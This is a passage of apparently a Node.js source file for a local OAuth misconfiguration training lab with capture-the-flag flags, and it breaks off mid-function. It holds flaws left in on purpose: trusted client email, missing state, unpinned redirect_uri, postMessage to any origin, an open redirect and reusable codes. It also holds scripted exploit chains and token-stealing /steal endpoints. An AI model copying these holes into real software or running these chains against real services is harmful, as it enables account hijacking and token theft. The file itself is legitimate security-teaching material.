/**
 * HarborNotes + HarborSocial — OAuth misconfiguration laboratory.
 *
 * PortSwigger / PayloadsAllTheThings gadgets:
 *   1. Authentication bypass via OAuth implicit flow
 *   2. Forced OAuth profile linking (no state)
 *   3. Account hijacking via unrestricted redirect_uri
 *   4. Token theft via a postMessage proxy page + redirect_uri traversal
 *   5. Token theft via an open redirect + redirect_uri traversal
 *   6. Authorization code reused (RFC 6749 MUST NOT)
 *
 * https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/#authorization-code-rule-violation
 */
const http = require('http');
const express = require('express');
const session = require('express-session');
const { OAuthStore, buildRedirect, redirectPermitted } = require('./oauth');

const NOTES_PORT = Number(process.env.NOTES_PORT || process.env.PORT || 4000);
const IDP_PORT = Number(process.env.IDP_PORT || 4098);
const WORKBENCH_PORT = Number(process.env.WORKBENCH_PORT || 4099);
const CLIENT_ID = process.env.CLIENT_ID || 'harbor-notes';
const NOTES_ORIGIN = process.env.NOTES_ORIGIN || `http://127.0.0.1:${NOTES_PORT}`;
const IDP_ORIGIN = process.env.IDP_ORIGIN || `http://127.0.0.1:${IDP_PORT}`;
const WB_ORIGIN = process.env.WB_ORIGIN || `http://127.0.0.1:${WORKBENCH_PORT}`;
const REGISTERED_REDIRECT = `${NOTES_ORIGIN}/oauth-callback`;

const FLAGS = {
  implicit: 'FLAG{oauth-implicit-email-swap}',
  linking: 'FLAG{oauth-forced-link}',
  hijack: 'FLAG{oauth-redirect-uri-hijack}',
  proxy: 'FLAG{oauth-proxy-page-token}',
  openredir: 'FLAG{oauth-open-redirect-token}',
  reuse: 'FLAG{oauth-code-reuse}',
  complete: 'FLAG{oauth-complete}',
};

const NOTES_USERS = {
  alice: {
    id: 'alice',
    password: 'letmein',
    email: 'alice@harbor.notes',
    name: 'Alice Nguyen',
    role: 'user',
    linkedSocial: 'alice.social',
    apiKey: 'hn_alice_dev',
  },
  carlos: {
    id: 'carlos',
    password: null,
    email: 'carlos@harbor.notes',
    name: 'Carlos Montoya',
    role: 'user',
    linkedSocial: 'carlos.social',
    apiKey: 'hn_carlos_secret',
  },
  admin: {
    id: 'admin',
    password: 'harboradmin',
    email: 'admin@harbor.notes',
    name: 'Harbor Admin',
    role: 'admin',
    linkedSocial: null,
    apiKey: 'hn_admin_root_key',
  },
};

const SOCIAL_USERS = {
  'alice.social': {
    id: 'alice.social',
    password: 'letmein',
    email: 'alice@harbor.notes',
    name: 'Alice Nguyen',
    apiKey: 'soc_alice',
  },
  'carlos.social': {
    id: 'carlos.social',
    password: 'carlos',
    email: 'carlos@harbor.notes',
    name: 'Carlos Montoya',
    apiKey: 'soc_carlos',
  },
  'admin.social': {
    id: 'admin.social',
    password: 'harboradmin',
    email: 'admin@harbor.notes',
    name: 'Harbor Admin',
    apiKey: 'soc_admin_apikey',
  },
  'attacker.social': {
    id: 'attacker.social',
    password: 'evil',
    email: 'attacker@evil.lab',
    name: 'Attacker',
    apiKey: 'soc_attacker',
  },
};

const store = new OAuthStore();
const stealLog = [];

function resetLab() {
  store.reset();
  stealLog.length = 0;
  NOTES_USERS.admin.linkedSocial = null;
  NOTES_USERS.alice.linkedSocial = 'alice.social';
  NOTES_USERS.carlos.linkedSocial = 'carlos.social';
}

function notesByEmail(email) {
  return Object.values(NOTES_USERS).find((u) => u.email === String(email || '').toLowerCase()) || null;
}

function notesFromSocial(social) {
  return (
    Object.values(NOTES_USERS).find((u) => u.linkedSocial === social.id) ||
    notesByEmail(social.email)
  );
}

function css() {
  return `
    :root { color-scheme: light; }
    body { font-family: Arial, Helvetica, sans-serif; font-weight: 500; max-width: 920px; margin: 0 auto; padding: 1.2rem; line-height: 1.5; color: #122033; background: #f4f7fb; }
    header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 1rem; }
    a { color: #0b5cab; }
    nav a { margin-right: 0.85rem; }
    code, pre, .mono { font-family: Consolas, ui-monospace, monospace; font-size: 0.9em; }
    button, .btn { font: inherit; padding: 0.4rem 0.8rem; background: #0b5cab; color: #fff; border: 0; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; margin: 0.2rem 0.3rem 0.2rem 0; }
    button.alt, .btn.alt { background: #334155; }
    label { display: block; margin: 0.5rem 0 0.15rem; font-weight: 700; }
    input { font: inherit; padding: 0.35rem 0.45rem; max-width: 280px; width: 100%; }
    .card { background: #fff; border: 1px solid #d5deea; border-radius: 10px; padding: 1rem 1.1rem; margin: 0.9rem 0; }
    .ok { border-left: 4px solid #047857; }
    .warn { border-left: 4px solid #b45309; }
    .err { border-left: 4px solid #b91c1c; }
    .lab { border-left: 4px solid #6d28d9; }
    .flag { color: #047857; font-weight: 700; }
    table { width: 100%; border-collapse: collapse; font-size: 0.92em; }
    th, td { text-align: left; padding: 0.35rem 0.45rem; border-bottom: 1px solid #e2e8f0; vertical-align: top; }
    pre { background: #0f172a; color: #e2e8f0; padding: 0.75rem; border-radius: 8px; white-space: pre-wrap; word-break: break-word; max-height: 22rem; overflow: auto; }
    footer { margin-top: 2rem; color: #64748b; font-size: 0.85rem; }
  `;
}

function layout(title, body, nav) {
  return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8" /><title>${title}</title><style>${css()}</style></head>
<body>
  <header><strong>${title}</strong><span class="mono">OAuth lab</span></header>
  <nav>${nav}</nav>
  ${body}
  <footer>
    PayloadsAllTheThings
    <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/">OAuth Misconfiguration</a>
    · WAF <a href="http://127.0.0.1:9080">:9080</a>
    · IdP <a href="${IDP_ORIGIN}/">${IDP_ORIGIN}</a>
    · Workbench <a href="${WB_ORIGIN}/">${WB_ORIGIN}</a>
  </footer>
</body>
</html>`;
}

function notesNav() {
  return `<a href="/">Home</a><a href="/login">Login</a><a href="/account">Account</a><a href="/admin">Admin</a><a href="/post/1">Blog</a><a href="/workbench">Workbench</a><a href="/logout">Log out</a>`;
}

function publicUser(u) {
  if (!u) return null;
  return { id: u.id, email: u.email, name: u.name, role: u.role, linkedSocial: u.linkedSocial };
}

function requestJson(host, port, method, path, { body = '', headers = {} } = {}) {
  return new Promise((resolve) => {
    const h = { Host: `${host}:${port}`, Connection: 'close', ...headers };
    if (body) {
      h['Content-Type'] = h['Content-Type'] || 'application/json';
      h['Content-Length'] = Buffer.byteLength(body);
    }
    const req = http.request({ host, port, path, method, headers: h, agent: false }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8');
        let json = null;
        try {
          json = JSON.parse(text);
        } catch {
          json = null;
        }
        resolve({ status: res.statusCode, headers: res.headers, body: text, json, location: res.headers.location || '' });
      });
    });
    req.on('error', (err) => resolve({ status: 0, error: err.message, headers: {}, body: '', json: null, location: '' }));
    req.setTimeout(8000, () => req.destroy(new Error('timeout')));
    if (body) req.write(body);
    req.end();
  });
}

function cookieHeader(setCookie) {
  const list = setCookie == null ? [] : Array.isArray(setCookie) ? setCookie : [setCookie];
  return list
    .map((l) => String(l).split(';')[0].trim())
    .filter(Boolean)
    .join('; ');
}

function notesApp() {
  const app = express();
  app.disable('x-powered-by');
  app.use(express.urlencoded({ extended: false }));
  app.use(express.json());
  app.use(
    session({
      name: 'notes_sid',
      secret: process.env.NOTES_SECRET || 'harbor-notes-secret',
      resave: false,
      saveUninitialized: false,
      cookie: { httpOnly: false, sameSite: 'lax', path: '/' },
    })
  );

  app.get('/health', (_req, res) => res.json({ ok: true, lab: 'oauth', role: 'notes' }));

  app.get('/', (req, res) => {
    const u = req.session.user;
    res.send(
      layout(
        'HarborNotes',
        `
        <h1>HarborNotes</h1>
        <p>Team notes with <strong>Sign in with HarborSocial</strong>.
        The implicit callback posts <code>token + email</code> to
        <code>/authenticate</code> and the server trusts the email.</p>
        <div class="card lab">
          ${u ? `<p>Signed in as <strong>${u.email}</strong> (${u.role})</p>` : '<p>Not signed in.</p>'}
          <a class="btn" href="/login">Login</a>
          <a class="btn alt" href="/login/social">HarborSocial (code)</a>
          <a class="btn alt" href="/login/social?flow=implicit">HarborSocial (implicit)</a>
        </div>
        `,
        notesNav()
      )
    );
  });

  app.get('/login', (req, res) => {
    res.send(
      layout(
        'HarborNotes — login',
        `
        <h1>Login</h1>
        <form method="post" action="/login">
          <label>Username</label><input name="username" value="alice" />
          <label>Password</label><input name="password" type="password" value="letmein" />
          <button type="submit">Sign in</button>
        </form>
        <p><a href="/login/social">Sign in with HarborSocial</a>
        · <a href="/login/social?flow=implicit">implicit flow</a></p>
        <p class="mono">alice / letmein · admin / harboradmin</p>
        `,
        notesNav()
      )
    );
  });

  app.post('/login', (req, res) => {
    const user = NOTES_USERS[req.body.username];
    if (!user || !user.password || user.password !== req.body.password) {
      return res.status(401).send(layout('HarborNotes', '<p class="err card">Bad password.</p>', notesNav()));
    }
    req.session.user = publicUser(user);
    res.redirect('/account');
  });

  app.get('/login/social', (req, res) => {
    const implicit = String(req.query.flow || '') === 'implicit';
    const type = implicit ? 'token' : 'code';
    const url =
      `${IDP_ORIGIN}/oauth/authorize?client_id=${CLIENT_ID}` +
      `&redirect_uri=${encodeURIComponent(REGISTERED_REDIRECT)}` +
      `&response_type=${type}&scope=openid%20profile%20email`;
    res.redirect(url);
  });

  app.get('/attach-social', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    const url =
      `${IDP_ORIGIN}/oauth/authorize?client_id=${CLIENT_ID}` +
      `&redirect_uri=${encodeURIComponent(`${NOTES_ORIGIN}/oauth-linking`)}` +
      `&response_type=code&scope=openid%20profile%20email`;
    res.redirect(url);
  });

  app.get('/oauth-callback', (req, res) => {
    if (req.query.code) {
      const exchanged = store.exchange(req.query.code);
      if (!exchanged) return res.status(400).send(layout('HarborNotes', '<p class="err card">Invalid code.</p>', notesNav()));
      const social = SOCIAL_USERS[exchanged.userId];
      const user = notesFromSocial(social);
      if (!user) return res.status(403).send(layout('HarborNotes', '<p class="err card">No HarborNotes user for that social profile.</p>', notesNav()));
      req.session.user = publicUser(user);
      req.session.via = 'authorization_code';
      req.session.codeUses = exchanged.useCount;
      return res.redirect('/account');
    }
    res.send(
      layout(
        'HarborNotes — implicit callback',
        `
        <h1>Finishing implicit login…</h1>
        <pre id="out">reading fragment</pre>
        <script>
          (async () => {
            const p = new URLSearchParams(location.hash.slice(1));
            const token = p.get('access_token');
            const me = await fetch('${IDP_ORIGIN}/oauth/me', { headers: { Authorization: 'Bearer ' + token } }).then(r => r.json());
            const body = { token, email: me.email, username: me.name };
            const r = await fetch('/authenticate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
            document.getElementById('out').textContent = await r.text();
            if (r.ok) location.href = '/account';
          })();
        </script>
        `,
        notesNav()
      )
    );
  });

  /**
   * Implicit-flow session mint. Token is checked for existence only —
   * email is taken from the client body (PortSwigger implicit lab).
   */
  app.post('/authenticate', (req, res) => {
    const token = String(req.body.token || '');
    const email = String(req.body.email || '').toLowerCase();
    const rec = store.lookupToken(token);
    if (!rec) return res.status(401).json({ ok: false, error: 'unknown access token' });
    const user = notesByEmail(email);
    if (!user) return res.status(404).json({ ok: false, error: 'unknown email' });
    req.session.user = publicUser(user);
    req.session.via = 'implicit';
    const flag = user.id === 'carlos' ? FLAGS.implicit : null;
    res.json({ ok: true, user: publicUser(user), flag });
  });

  app.get('/oauth-linking', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    const exchanged = store.exchange(req.query.code);
    if (!exchanged) return res.status(400).send(layout('HarborNotes', '<p class="err card">Invalid code.</p>', notesNav()));
    const social = SOCIAL_USERS[exchanged.userId];
    const notes = NOTES_USERS[req.session.user.id];
    notes.linkedSocial = social.id;
    req.session.user = publicUser(notes);
    res.redirect('/account');
  });

  app.get('/account', (req, res) => {
    const u = req.session.user;
    if (!u) return res.redirect('/login');
    const flags = [];
    if (u.id === 'carlos') flags.push(FLAGS.implicit);
    if (u.id === 'admin' && NOTES_USERS.admin.linkedSocial === 'attacker.social') flags.push(FLAGS.linking);
    if (u.id === 'admin' && req.session.via === 'authorization_code') flags.push(FLAGS.hijack);
    res.send(
      layout(
        'HarborNotes — account',
        `
        <h1>Account</h1>
        <div class="card ok">
          <p>${u.name} · <code>${u.email}</code> · role ${u.role}</p>
          <p>Linked social: <code>${NOTES_USERS[u.id].linkedSocial || '(none)'}</code></p>
          ${flags.map((f) => `<p class="flag">${f}</p>`).join('')}
        </div>
        <p><a class="btn" href="/attach-social">Attach a social profile</a></p>
        `,
        notesNav()
      )
    );
  });

  app.get('/admin', (req, res) => {
    const u = req.session.user;
    if (!u || u.role !== 'admin') {
      return res.status(403).send(layout('HarborNotes', '<p class="err card">Admins only.</p>', notesNav()));
    }
    const flags = [FLAGS.hijack];
    if (NOTES_USERS.admin.linkedSocial === 'attacker.social') flags.push(FLAGS.linking);
    res.send(
      layout(
        'HarborNotes — admin',
        `<h1>Admin</h1><div class="card ok">${flags.map((f) => `<p class="flag">${f}</p>`).join('')}<p>API key <code>${NOTES_USERS.admin.apiKey}</code></p></div>`,
        notesNav()
      )
    );
  });

  app.get('/me', (req, res) => {
    if (!req.session.user) return res.status(401).json({ ok: false });
    const u = NOTES_USERS[req.session.user.id];
    res.json({
      ok: true,
      user: publicUser(u),
      via: req.session.via || null,
      flags: {
        implicit: u.id === 'carlos' ? FLAGS.implicit : null,
        linking: u.id === 'admin' && u.linkedSocial === 'attacker.social' ? FLAGS.linking : null,
        hijack: u.id === 'admin' && req.session.via === 'authorization_code' ? FLAGS.hijack : null,
      },
    });
  });

  app.get('/post/next', (req, res) => {
    const path = String(req.query.path || '/');
    res.redirect(302, path);
  });

  app.get('/post/:id', (req, res) => {
    res.send(
      layout(
        'HarborNotes — post',
        `
        <h1>Standup notes #${req.params.id}</h1>
        <p>Ship the OAuth client this week. Implicit is “easier for the SPA.”</p>
        <iframe src="/post/comment/comment-form" style="width:100%;height:140px;border:1px solid #d5deea;border-radius:8px;"></iframe>
        <p><a href="/post/next?path=/post/2">Next post</a></p>
        `,
        notesNav()
      )
    );
  });

  app.get('/post/comment/comment-form', (_req, res) => {
    res.send(`<!DOCTYPE html>
<html><head><meta charset="utf-8" /><title>comment form</title>
<style>body{font-family:Arial,sans-serif;margin:0.6rem;}</style></head>
<body>
  <form id="comment-form"><input name="body" placeholder="Write a comment" /><button type="submit">Post</button></form>
  <script>
    parent.postMessage({ type: 'onload', data: window.location.href }, '*');
    function submitForm(form, ev) {
      ev.preventDefault();
      parent.postMessage({ type: 'oncomment', content: { href: window.location.href } }, '*');
    }
    document.getElementById('comment-form').addEventListener('submit', function (ev) { submitForm(this, ev); });
  </script>
</body></html>`);
  });

  app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
  });

  app.get('/workbench', (_req, res) => res.redirect(WB_ORIGIN + '/'));

  return app;
}

function idpApp() {
  const app = express();
  app.disable('x-powered-by');
  app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', NOTES_ORIGIN);
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    if (req.method === 'OPTIONS') return res.sendStatus(204);
    next();
  });
  app.use(express.urlencoded({ extended: false }));
  app.use(express.json());
  app.use(
    session({
      name: 'idp_sid',
      secret: process.env.IDP_SECRET || 'harbor-social-secret',
      resave: false,
      saveUninitialized: false,
      cookie: { httpOnly: false, sameSite: 'lax', path: '/' },
    })
  );

  function meJson(social) {
    return {
      id: social.id,
      email: social.email,
      name: social.name,
      apiKey: social.apiKey,
      flag:
        social.id === 'admin.social'
          ? FLAGS.proxy
          : social.apiKey === 'soc_admin_apikey'
            ? FLAGS.proxy
            : null,
    };
  }

  app.get('/health', (_req, res) => res.json({ ok: true, lab: 'oauth', role: 'idp' }));

  app.get('/', (_req, res) => {
    res.send(
      layout(
        'HarborSocial',
        `<h1>HarborSocial</h1><p>OAuth 2 authorization server for the lab.
        Registered client <code>${CLIENT_ID}</code>.
        <code>redirect_uri</code> is not pinned to a single URL.</p>
        <p><a class="btn" href="/oauth/login">IdP login</a></p>
        <p class="mono">alice.social / letmein · admin.social / harboradmin · attacker.social / evil</p>`,
        `<a href="/oauth/login">Login</a>`
      )
    );
  });

  app.get('/oauth/login', (req, res) => {
    res.send(
      layout(
        'HarborSocial — login',
        `
        <form method="post" action="/oauth/login">
          <input type="hidden" name="next" value="${String(req.query.next || '').replace(/"/g, '&quot;')}" />
          <label>Username</label><input name="username" value="alice.social" />
          <label>Password</label><input name="password" type="password" value="letmein" />
          <button type="submit">Authorize</button>
        </form>
        `,
        ''
      )
    );
  });

  app.post('/oauth/login', (req, res) => {
    const user = SOCIAL_USERS[req.body.username];
    if (!user || user.password !== req.body.password) {
      return res.status(401).send(layout('HarborSocial', '<p class="err card">Bad IdP password.</p>', ''));
    }
    req.session.social = { id: user.id };
    const next = req.body.next || '/';
    res.redirect(next);
  });

  app.get('/oauth/authorize', (req, res) => {
    if (!req.session.social) {
      const next = encodeURIComponent(req.originalUrl);
      return res.redirect(`/oauth/login?next=${next}`);
    }
    const clientId = String(req.query.client_id || '');
    const redirectUri = String(req.query.redirect_uri || '');
    const responseType = String(req.query.response_type || 'code');
    const state = req.query.state ? String(req.query.state) : '';
    if (clientId !== CLIENT_ID) return res.status(400).send('unknown client_id');
    if (!redirectPermitted(redirectUri, REGISTERED_REDIRECT)) {
      return res.status(400).send('redirect_uri rejected');
    }
    const issued = store.authorize({
      userId: req.session.social.id,
      clientId,
      redirectUri,
      responseType,
    });
    const loc = buildRedirect({
      redirectUri,
      responseType,
      code: issued.code,
      accessToken: issued.accessToken,
      state,
    });
    res.redirect(302, loc);
  });

  app.get('/oauth/code-info', (req, res) => {
    const rec = store.codes.get(String(req.query.code || ''));
    if (!rec) return res.status(404).json({ ok: false });
    res.json({ ok: true, redirectUri: rec.redirectUri, used: rec.used, useCount: rec.useCount, userId: rec.userId });
  });

  app.post('/oauth/token', (req, res) => {
    const code = String(req.body.code || req.query.code || '');
    const exchanged = store.exchange(code);
    if (!exchanged) return res.status(400).json({ error: 'invalid_grant' });
    res.json({
      access_token: exchanged.accessToken,
      token_type: 'Bearer',
      expires_in: 3600,
      use_count: exchanged.useCount,
      flag: exchanged.useCount >= 2 ? FLAGS.reuse : null,
    });
  });

  function bearer(req) {
    const h = String(req.headers.authorization || '');
    const m = h.match(/^Bearer\s+(\S+)/i);
    return m ? m[1] : String(req.query.access_token || '');
  }

  function handleMe(req, res) {
    const rec = store.lookupToken(bearer(req));
    if (!rec) return res.status(401).json({ error: 'invalid_token' });
    const social = SOCIAL_USERS[rec.userId];
    const body = meJson(social);
    if (social.id === 'admin.social') {
      body.flag_proxy = FLAGS.proxy;
      body.flag_openredir = FLAGS.openredir;
    }
    res.json(body);
  }
  app.get('/oauth/me', handleMe);
  app.get('/me', handleMe);

  app.get('/oauth/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
  });

  return app;
}

function workbenchPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8" /><title>OAuth workbench</title><style>${css()}</style></head>
<body>
  <header><strong>OAuth attack workbench</strong><span class="mono">HarborSocial + HarborNotes</span></header>
  <h1>PayloadsAllTheThings / PortSwigger OAuth labs</h1>
  <p>Each button runs the gadget server-side (IdP session + redirects + token use).
  Chrome can also drive the real implicit callback and the comment-form <code>postMessage</code>.</p>
  <div class="card lab">
    <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/#authorization-code-rule-violation">PAT: OAuth misconfiguration</a>
  </div>
  <table>
    <tr><th>Stage</th><th>Flaw</th></tr>
    <tr><td>Implicit email swap</td><td><code>POST /authenticate</code> trusts body email</td></tr>
    <tr><td>Forced linking</td><td><code>/oauth-linking</code> has no <code>state</code></td></tr>
    <tr><td>redirect_uri hijack</td><td>IdP accepts any absolute redirect</td></tr>
    <tr><td>Proxy page</td><td><code>redirect_uri</code> prefix + <code>postMessage(..., '*')</code></td></tr>
    <tr><td>Open redirect</td><td><code>/post/next?path=</code> chained after traversal</td></tr>
    <tr><td>Code reuse</td><td>authorization code exchanged twice</td></tr>
  </table>
  <div class="card">
    <button type="button" onclick="run('implicit')">1. Implicit bypass</button>
    <button type="button" onclick="run('linking')">2. Forced link</button>
    <button type="button" onclick="run('hijack')">3. redirect_uri hijack</button>
    <button type="button" onclick="run('proxy')">4. Proxy page token</button>
    <button type="button" onclick="run('openredir')">5. Open redirect token</button>
    <button type="button" onclick="run('reuse')">6. Code reuse</button>
    <button type="button" class="alt" onclick="trophy()">Trophy</button>
    <button type="button" class="alt" onclick="wafProbe()">Replay implicit through WAF</button>
    <button type="button" class="alt" onclick="resetLab()">Reset</button>
    <p><a class="btn" href="${NOTES_ORIGIN}/">HarborNotes</a>
    <a class="btn alt" href="${IDP_ORIGIN}/">HarborSocial</a>
    <a class="btn alt" href="http://127.0.0.1:9080/">WAF VIP</a></p>
    <pre id="out">Click a stage.</pre>
  </div>
  <script>
    const out = document.getElementById('out');
    const got = new Set();
    async function post(url, body) {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body || {}) });
      return r.json();
    }
    function show(obj) {
      const flag = obj && obj.flag;
      if (flag) got.add(obj.stage || flag);
      out.textContent = (flag ? flag + '\\n\\n' : '') + JSON.stringify(obj, null, 2);
    }
    async function run(stage) { show(Object.assign({ stage }, await post('/api/' + stage))); }
    async function trophy() { show(await (await fetch('/api/trophy?stages=' + encodeURIComponent([...got].join(',')))).json()); }
    async function wafProbe() { show(await post('/api/waf-probe')); }
    async function resetLab() { show(await post('/api/reset')); got.clear(); }
    window.run = run; window.trophy = trophy; window.wafProbe = wafProbe; window.resetLab = resetLab;
  </script>
</body>
</html>`;
}

async function idpLogin(username, password) {
  const page = await requestJson('127.0.0.1', IDP_PORT, 'GET', '/oauth/login');
  const cookie = cookieHeader(page.headers['set-cookie']);
  const login = await requestJson('127.0.0.1', IDP_PORT, 'POST', '/oauth/login', {
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookie },
  });
  return cookieHeader(login.headers['set-cookie']) || cookie;
}

async function notesLogin(username, password) {
  const page = await requestJson('127.0.0.1', NOTES_PORT, 'GET', '/login');
  let cookie = cookieHeader(page.headers['set-cookie']);
  const login = await requestJson('127.0.0.1', NOTES_PORT, 'POST', '/login', {
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookie },
  });
  cookie = cookieHeader(login.headers['set-cookie']) || cookie;
  return cookie;
}

function authorizePath({ redirectUri, responseType, state = '' }) {
  const q = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: redirectUri,
    response_type: responseType,
    scope: 'openid profile email',
  });
  if (state) q.set('state', state);
  return `/oauth/authorize?${q}`;
}

function parseHashToken(location) {
  const i = String(location || '').indexOf('#');
  if (i < 0) return null;
  return new URLSearchParams(location.slice(i + 1)).get('access_token');
}

function parseCode(location) {
  try {
    const u = new URL(location, 'http://127.0.0.1');
    return u.searchParams.get('code');
  } catch {
    const m = String(location || '').match(/[?&]code=([^&#]+)/);
    return m ? decodeURIComponent(m[1]) : null;
  }
}

async function workbenchHandlers(app) {
  app.get('/', (_req, res) => res.send(workbenchPage()));
  app.get('/health', (_req, res) => res.json({ ok: true, lab: 'oauth', role: 'workbench', steal: stealLog.length }));

  app.get('/steal', (req, res) => {
    stealLog.push({ at: Date.now(), query: req.query, url: req.originalUrl });
    res.type('text').send('stolen');
  });

  app.get('/steal-hash', (_req, res) => {
    res.send(`<!DOCTYPE html><html><body><pre id="x">waiting for fragment</pre>
      <script>
        const p = new URLSearchParams(location.hash.slice(1));
        const token = p.get('access_token');
        fetch('/api/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ access_token: token, href: location.href }) });
        document.getElementById('x').textContent = token || location.hash;
      </script></body></html>`);
  });

  app.post('/api/log', (req, res) => {
    stealLog.push({ at: Date.now(), body: req.body });
    res.json({ ok: true });
  });

  app.post('/api/reset', (_req, res) => {
    resetLab();
    res.json({ ok: true, zone: store.snapshot() });
  });

  app.post('/api/implicit', async (_req, res) => {
    const cookie = await idpLogin('alice.social', 'letmein');
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: REGISTERED_REDIRECT,
      responseType: 'token',
    }), { headers: { Cookie: cookie } });
    const token = parseHashToken(auth.location);
    const minted = await requestJson('127.0.0.1', NOTES_PORT, 'POST', '/authenticate', {
      body: JSON.stringify({ token, email: 'carlos@harbor.notes', username: 'Carlos' }),
    });
    res.json({
      ok: Boolean(minted.json && minted.json.flag),
      token: token && token.slice(0, 12) + '…',
      authenticate: minted.json,
      flag: minted.json && minted.json.flag,
    });
  });

  app.post('/api/linking', async (_req, res) => {
    NOTES_USERS.admin.linkedSocial = null;
    const adminCookie = await notesLogin('admin', 'harboradmin');
    const idpCookie = await idpLogin('attacker.social', 'evil');
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: `${NOTES_ORIGIN}/oauth-linking`,
      responseType: 'code',
    }), { headers: { Cookie: idpCookie } });
    const code = parseCode(auth.location);
    await requestJson('127.0.0.1', NOTES_PORT, 'GET', `/oauth-linking?code=${encodeURIComponent(code)}`, {
      headers: { Cookie: adminCookie },
    });
    const auth2 = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: REGISTERED_REDIRECT,
      responseType: 'code',
    }), { headers: { Cookie: idpCookie } });
    const code2 = parseCode(auth2.location);
    const cb = await requestJson('127.0.0.1', NOTES_PORT, 'GET', `/oauth-callback?code=${encodeURIComponent(code2)}`);
    const sid = cookieHeader(cb.headers['set-cookie']);
    const me = await requestJson('127.0.0.1', NOTES_PORT, 'GET', '/me', { headers: { Cookie: sid } });
    res.json({
      ok: Boolean(me.json && me.json.flags && me.json.flags.linking),
      linkedSocial: NOTES_USERS.admin.linkedSocial,
      me: me.json,
      flag: me.json && me.json.flags && me.json.flags.linking,
    });
  });

  app.post('/api/hijack', async (_req, res) => {
    const idpCookie = await idpLogin('admin.social', 'harboradmin');
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: `${WB_ORIGIN}/steal`,
      responseType: 'code',
    }), { headers: { Cookie: idpCookie } });
    const code = parseCode(auth.location);
    stealLog.push({ at: Date.now(), hijackCode: code, location: auth.location });
    const cb = await requestJson('127.0.0.1', NOTES_PORT, 'GET', `/oauth-callback?code=${encodeURIComponent(code)}`);
    const sid = cookieHeader(cb.headers['set-cookie']);
    const me = await requestJson('127.0.0.1', NOTES_PORT, 'GET', '/me', { headers: { Cookie: sid } });
    res.json({
      ok: Boolean(me.json && me.json.user && me.json.user.id === 'admin'),
      code: code && code.slice(0, 16) + '…',
      redirect: auth.location,
      me: me.json,
      flag: me.json && me.json.user && me.json.user.id === 'admin' ? FLAGS.hijack : null,
    });
  });

  app.post('/api/proxy', async (_req, res) => {
    const idpCookie = await idpLogin('admin.social', 'harboradmin');
    const evil = `${NOTES_ORIGIN}/oauth-callback/../post/comment/comment-form`;
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: evil,
      responseType: 'token',
    }), { headers: { Cookie: idpCookie } });
    const token = parseHashToken(auth.location);
    const gadget = await requestJson('127.0.0.1', NOTES_PORT, 'GET', '/post/comment/comment-form');
    const me = await requestJson('127.0.0.1', IDP_PORT, 'GET', '/oauth/me', {
      headers: { Authorization: `Bearer ${token}` },
    });
    res.json({
      ok: Boolean(me.json && me.json.apiKey === 'soc_admin_apikey'),
      redirect: auth.location,
      gadget: gadget.body.includes("postMessage") && gadget.body.includes("'*'"),
      me: me.json,
      flag: me.json && me.json.apiKey === 'soc_admin_apikey' ? FLAGS.proxy : null,
    });
  });

  app.post('/api/openredir', async (_req, res) => {
    const idpCookie = await idpLogin('admin.social', 'harboradmin');
    const evil = `${NOTES_ORIGIN}/oauth-callback/../post/next?path=${encodeURIComponent(`${WB_ORIGIN}/steal-hash`)}`;
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: evil,
      responseType: 'token',
    }), { headers: { Cookie: idpCookie } });
    const hop = await requestJson('127.0.0.1', NOTES_PORT, 'GET', `/post/next?path=${encodeURIComponent(`${WB_ORIGIN}/steal-hash`)}`);
    const token = parseHashToken(auth.location);
    const me = await requestJson('127.0.0.1', IDP_PORT, 'GET', '/oauth/me', {
      headers: { Authorization: `Bearer ${token}` },
    });
    res.json({
      ok: Boolean(me.json && me.json.apiKey === 'soc_admin_apikey' && hop.status === 302),
      idpLocation: auth.location,
      nextLocation: hop.location,
      me: me.json,
      flag: me.json && me.json.apiKey === 'soc_admin_apikey' ? FLAGS.openredir : null,
    });
  });

  app.post('/api/reuse', async (_req, res) => {
    const cookie = await idpLogin('alice.social', 'letmein');
    const auth = await requestJson('127.0.0.1', IDP_PORT, 'GET', authorizePath({
      redirectUri: REGISTERED_REDIRECT,
      responseType: 'code',
    }), { headers: { Cookie: cookie } });
    const code = parseCode(auth.location);
    const first = await requestJson('127.0.0.1', IDP_PORT, 'POST', '/oauth/token', {
      body: JSON.stringify({ grant_type: 'authorization_code', code, client_id: CLIENT_ID }),
    });
    const second = await requestJson('127.0.0.1', IDP_PORT, 'POST', '/oauth/token', {
      body: JSON.stringify({ grant_type: 'authorization_code', code, client_id: CLIENT_ID }),
    });
    res.json({
      ok: Boolean(second.json && second.json.flag),
